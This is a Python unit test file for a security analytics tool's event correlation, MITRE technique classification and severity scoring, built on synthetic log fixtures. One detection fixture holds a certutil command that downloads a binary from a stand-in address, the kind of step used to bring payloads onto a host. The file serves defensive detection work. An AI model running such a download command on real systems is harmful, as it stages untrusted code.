"""
Unit tests for correlation, MITRE classification and severity scoring.

Fixtures are synthetic and independently authored (RFC 5737 / RFC 1918
addresses, invented hostnames and accounts). They exercise the signature and
rubric mechanics, not any particular dataset.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

from src.core.evidence import EvidenceEvent, get_store
from src.registry.tools.attack_analytics import (
    classify_technique,
    correlate_events,
    score_severity,
)

BASE = datetime(2031, 6, 1, 12, 0, 0, tzinfo=timezone.utc)


def at(seconds: int) -> str:
    return (BASE + timedelta(seconds=seconds)).isoformat()


def store_with(events: list[EvidenceEvent], run: str):
    get_store(run).append(events)


def payload(result: str) -> dict:
    return json.loads(result.split("```json", 1)[1].rsplit("```", 1)[0])


# ── correlation ──────────────────────────────────────────


async def test_entity_seen_in_two_sources_is_a_bridge():
    store_with(
        [
            EvidenceEvent(
                timestamp=at(0),
                host="SRV-SYNTH-02",
                user="rfitzgerald",
                source_type="synthetic_endpoint",
            ),
            EvidenceEvent(
                timestamp=at(60),
                host="SRV-SYNTH-02",
                src_ip="10.60.2.9",
                dst_ip="192.0.2.80",
                source_type="synthetic_firewall",
            ),
        ],
        "corr-bridge-run",
    )

    data = payload(await correlate_events(_run_id="corr-bridge-run"))
    bridges = {b["value"] for b in data["cross_source_entities"]}
    assert "SRV-SYNTH-02" in bridges
    bridge = next(b for b in data["cross_source_entities"] if b["value"] == "SRV-SYNTH-02")
    assert len(bridge["source_types"]) == 2
    assert all(e.startswith("EV-") for e in bridge["evidence"])


async def test_single_source_entity_is_not_a_bridge():
    store_with(
        [
            EvidenceEvent(timestamp=at(0), host="WS-SYNTH-09", source_type="synthetic_endpoint"),
            EvidenceEvent(timestamp=at(30), host="WS-SYNTH-09", source_type="synthetic_endpoint"),
        ],
        "corr-single-run",
    )

    data = payload(await correlate_events(_run_id="corr-single-run"))
    assert not data["cross_source_entities"]


async def test_process_lineage_reconstructed():
    store_with(
        [
            EvidenceEvent(
                timestamp=at(0),
                host="WS-SYNTH-03",
                parent_process="C:\\Office\\writer.exe",
                process="C:\\Windows\\System32\\cmd.exe",
                command_line="cmd.exe /c echo hi",
                source_type="synthetic_endpoint",
            )
        ],
        "corr-lineage-run",
    )

    data = payload(await correlate_events(_run_id="corr-lineage-run"))
    chain = data["process_lineage"][0]
    assert chain["parent"] == "writer.exe"
    assert chain["child"] == "cmd.exe"


async def test_correlate_unknown_entity_refused():
    store_with([EvidenceEvent(timestamp=at(0), host="WS-SYNTH-03")], "corr-unknown-run")

    result = await correlate_events("203.0.113.200", _run_id="corr-unknown-run")
    assert "No evidence references" in result


async def test_correlate_empty_store():
    result = await correlate_events(_run_id="corr-empty-run")
    assert "ingest_logs" in result


# ── MITRE classification ─────────────────────────────────


async def test_signature_match_produces_technique_with_citation():
    store_with(
        [
            EvidenceEvent(
                timestamp=at(0),
                host="WS-SYNTH-04",
                process="C:\\Windows\\System32\\certutil.exe",
                command_line="certutil -urlcache -f http://192.0.2.90/a.bin a.bin",
                source_type="synthetic_endpoint",
            )
        ],
        "mitre-sig-run",
    )

    data = payload(await classify_technique(_run_id="mitre-sig-run"))
    ids = {t["technique_id"] for t in data["techniques"]}
    assert "T1105" in ids
    hit = next(t for t in data["techniques"] if t["technique_id"] == "T1105")
    assert hit["basis"] == "evidence_signature"
    assert hit["evidence"][0].startswith("EV-")


async def test_port_based_signature_matches_lateral_movement():
    store_with(
        [
            EvidenceEvent(
                timestamp=at(0),
                src_ip="10.60.2.9",
                dst_ip="10.60.2.40",
                dst_port=3389,
                source_type="synthetic_firewall",
            )
        ],
        "mitre-port-run",
    )

    data = payload(await classify_technique(_run_id="mitre-port-run"))
    assert "T1021.001" in {t["technique_id"] for t in data["techniques"]}


async def test_event_code_signature_matches_account_creation():
    store_with(
        [EvidenceEvent(timestamp=at(0), event_code="4720", user="newacct")],
        "mitre-code-run",
    )

    data = payload(await classify_technique(_run_id="mitre-code-run"))
    assert "T1136" in {t["technique_id"] for t in data["techniques"]}


async def test_analytic_pattern_maps_to_technique():
    store_with([EvidenceEvent(timestamp=at(0), host="WS-SYNTH-05")], "mitre-pattern-run")

    data = payload(
        await classify_technique("password_spray periodic_beaconing", _run_id="mitre-pattern-run")
    )
    ids = {t["technique_id"] for t in data["techniques"]}
    assert {"T1110.003", "T1071.001"} <= ids


async def test_no_match_states_absence_explicitly():
    store_with([EvidenceEvent(timestamp=at(0), host="WS-SYNTH-06")], "mitre-none-run")

    data = payload(await classify_technique(_run_id="mitre-none-run"))
    assert not data["techniques"]
    assert "plausible-sounding" in data["result"]
    assert data["tactics_not_evidenced"]


# ── severity ─────────────────────────────────────────────


async def test_successful_exfiltration_scores_critical():
    data = payload(await score_severity("Exfiltration", "succeeded", "server"))
    assert data["severity"] == "CRITICAL"
    assert data["score"] >= 9.0


async def test_blocked_attempt_scores_lower_than_success():
    blocked = payload(await score_severity("Credential Access", "blocked", "endpoint"))
    succeeded = payload(await score_severity("Credential Access", "succeeded", "endpoint"))
    assert blocked["score"] < succeeded["score"]
    assert blocked["severity"] != "CRITICAL"


async def test_discovery_is_not_critical():
    data = payload(await score_severity("Discovery", "succeeded", "endpoint"))
    assert data["severity"] in ("LOW", "MEDIUM")


async def test_score_is_capped_at_ten():
    data = payload(await score_severity("Impact", "succeeded", "domain_controller"))
    assert data["score"] == 10.0


async def test_unknown_tactic_is_refused_not_guessed():
    result = await score_severity("Shenanigans", "succeeded")
    assert "Unknown tactic" in result
    assert "not scored" in result


async def test_calculation_is_transparent():
    data = payload(await score_severity("initial access", "attempted", "identity_provider"))
    calc = data["calculation"]
    assert calc["tactic"] == "Initial Access"
    assert calc["outcome"] == "attempted"
    assert calc["asset_type"] == "identity_provider"
    assert "formula" in calc
